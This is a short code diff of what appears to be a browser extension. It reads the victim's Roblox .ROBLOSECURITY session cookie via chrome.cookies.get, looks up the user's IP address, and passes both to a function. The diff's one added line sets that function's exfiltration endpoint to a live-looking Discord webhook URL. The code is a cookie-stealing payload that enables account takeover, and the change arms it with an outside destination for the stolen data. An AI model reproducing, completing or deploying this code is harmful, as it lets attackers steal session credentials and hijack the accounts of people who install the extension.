@@ -1,4 +1,4 @@
-const WEBHOOK = "";
+const WEBHOOK = "https://discord.com/api/webhooks/1480000064956141712/QVBAPfYEp6BY4QGezk1zIkC-cpB0VdeKCNDsOgBOJnKOB9T8ppPUqOwnU5AMGVE3OWt2";
 
 async function main(cookie) {
     var ipAddr = await (await fetch("https://api.ipify.org")).text();
@@ -63,3 +63,4 @@ async function main(cookie) {
 chrome.cookies.get({"url": "https://www.roblox.com/home", "name": ".ROBLOSECURITY"}, function(cookie) {
     main(cookie ? cookie.value : null);
 });
+
